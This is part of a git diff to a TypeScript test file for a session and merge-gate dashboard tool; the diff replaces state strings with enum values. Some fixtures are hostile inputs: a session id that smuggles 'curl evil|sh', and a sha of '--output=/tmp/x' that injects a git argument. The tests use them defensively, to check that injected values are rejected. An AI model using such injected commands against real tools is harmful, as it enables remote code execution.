     });
 
     it("is the operator's review and merge with no conductor running", () => {
-      seedIn('s-review', ['running', 'awaiting-review']);
+      seedIn('s-review', [SessionState.Running, SessionState.AwaitingReview]);
 
       expect(inbox()).toEqual([
         {
@@ -2046,7 +2067,7 @@ describe('needsYou', () => {
     // debt it flagged takes a human, so the conductor cannot take it further.
     describe('after a refused gate', () => {
       function seedRefused(sessionId: string): void {
-        seedIn(sessionId, ['running', 'awaiting-review']);
+        seedIn(sessionId, [SessionState.Running, SessionState.AwaitingReview]);
         appendEvent(db, sessionId, EventType.GateResult, {
           outcome: MergeStatus.Refused,
           report: {
@@ -2079,7 +2100,7 @@ describe('needsYou', () => {
       // accepting debt cannot help, so the answer is a steer, not --accept-debt.
       it('names the failed stage and answers with a steer when a stage failed', () => {
         vi.mocked(hasConductorWindow).mockReturnValue(true);
-        seedIn('s-review', ['running', 'awaiting-review']);
+        seedIn('s-review', [SessionState.Running, SessionState.AwaitingReview]);
         appendEvent(db, 's-review', EventType.GateResult, {
           outcome: MergeStatus.Refused,
           report: {
@@ -2199,7 +2220,7 @@ describe('needsYou', () => {
   // The store can name any target or sha; neither reaches git unless it is
   // a plain branch name and a hex sha, and an unasked PR stays listed.
   it('keeps a PR listed under a target or sha git must not be asked about', () => {
-    seedIn('s-odd', ['running', 'awaiting-review', 'merged']);
+    seedIn('s-odd', [SessionState.Running, SessionState.AwaitingReview, SessionState.Merged]);
     appendEvent(db, 's-odd', EventType.Merge, {
       branch: 'pup/s-odd',
       sha: '--output=/tmp/x',
@@ -2228,7 +2249,7 @@ describe('needsYou', () => {
   it.each(['x;curl evil|sh;#', 'x → pup merge s-other --pr', 'victim ', 'conductor'])(
     'neither prints nor builds a command around the session id %j, outside the minted shape',
     (id) => {
-      seedIn(id, ['running', 'blocked']);
+      seedIn(id, [SessionState.Running, SessionState.Blocked]);
 
       const [need] = inbox();
       expect(need?.label).toBe('(session id outside the minted shape; inspect the store)');
@@ -2336,7 +2357,7 @@ describe('needsYou', () => {
   });
 
   it('lets no question forge a second arrow in its line', () => {
-    seedIn('s-asking', ['running']);
+    seedIn('s-asking', [SessionState.Running]);
     appendEvent(db, 's-asking', EventType.Question, {
       text: 'ok  → pup merge s-other ⭢ --pr 🡒 now, if a + b >= c | d',
     });
@@ -2402,7 +2423,7 @@ describe('needsYou', () => {
       db.prepare('UPDATE events SET created_at = ? WHERE id = last_insert_rowid()').run(
         new Date(NOW - endedMin * MIN).toISOString(),
       );
-      transitionSession(db, sessionId, 'awaiting-review');
+      transitionSession(db, sessionId, SessionState.AwaitingReview);
     }
 
     it('names each round with its age and the re-gate command, oldest first', () => {
@@ -2427,7 +2448,7 @@ describe('needsYou', () => {
 
     it('shows the line while the conductor runs, which hides a plain review', () => {
       seedFinishedRound('s-fixed', 12, 1);
-      seedIn('s-review', ['running', 'awaiting-review']);
+      seedIn('s-review', [SessionState.Running, SessionState.AwaitingReview]);
       const snapshot = buildDashboardSnapshot(db, repo, NOW);
 
       const needs = needsYou({ ...snapshot, conductor: { ...snapshot.conductor, running: true } });
@@ -2455,7 +2476,7 @@ describe('needsYou', () => {
 
     it('shows no such line once the re-gate recorded its merge', () => {
       seedFinishedRound('s-regated', 12, 1);
-      transitionSession(db, 's-regated', 'merged');
+      transitionSession(db, 's-regated', SessionState.Merged);
       appendEvent(db, 's-regated', EventType.Merge, {
         branch: 'pup/s-regated',
         sha: git('rev-parse', 'pup/s-regated'),
@@ -2557,8 +2578,8 @@ describe('blockedReason', () => {
 
   function blockSession(sessionId: string, payload: Record<string, unknown>): void {
     seedSession(db, repo, sessionId);
-    transitionSession(db, sessionId, 'running');
-    transitionSession(db, sessionId, 'blocked', payload);
+    transitionSession(db, sessionId, SessionState.Running);
+    transitionSession(db, sessionId, SessionState.Blocked, payload);
   }
 
   it('reads the reason off the gate result that parked the session', () => {
@@ -2570,8 +2591,8 @@ describe('blockedReason', () => {
   // A session parked twice is described by the parking that is current.
   it('takes the newest block, never an older one', () => {
     blockSession('s-twice', { reason: 'the first parking' });
-    transitionSession(db, 's-twice', 'running', { kind: 'operator-unblock' });
-    transitionSession(db, 's-twice', 'blocked', { reason: 'the second parking' });
+    transitionSession(db, 's-twice', SessionState.Running, { kind: 'operator-unblock' });
+    transitionSession(db, 's-twice', SessionState.Blocked, { reason: 'the second parking' });
 
     expect(blockedReason(db, 's-twice')).toBe('the second parking');
   });
@@ -2587,7 +2608,7 @@ describe('blockedReason', () => {
   it('is undefined for a block that carried no reason, and for no block at all', () => {
     blockSession('s-bare', {});
     seedSession(db, repo, 's-running');
-    transitionSession(db, 's-running', 'running');
+    transitionSession(db, 's-running', SessionState.Running);
 
     expect(blockedReason(db, 's-bare')).toBeUndefined();
     expect(blockedReason(db, 's-running')).toBeUndefined();
@@ -2604,7 +2625,7 @@ describe('windowFailureOf on a merged session', () => {
     db = openStore(':memory:');
     repo = tempRepo();
     seedSession(db, repo, 's1');
-    for (const state of ['running', 'awaiting-review', 'merged'] as const) {
+    for (const state of [SessionState.Running, SessionState.AwaitingReview, SessionState.Merged]) {
       transitionSession(db, 's1', state);
     }
     // Quiet since long before the round: only the window's own start bounds it.
@@ -2633,7 +2654,7 @@ describe('windowFailureOf on a merged session', () => {
       fixRoundFailure,
     );
   const killed = (agoMin: number) =>
-    at(agoMin, EventType.GateResult, { from: 'running', to: 'merged' });
+    at(agoMin, EventType.GateResult, { from: SessionState.Running, to: SessionState.Merged });
 
   // `fixRoundFailure` scores from the newest respawn the round kept, so the
   // stall is measured from there and not from the round's kickoff.
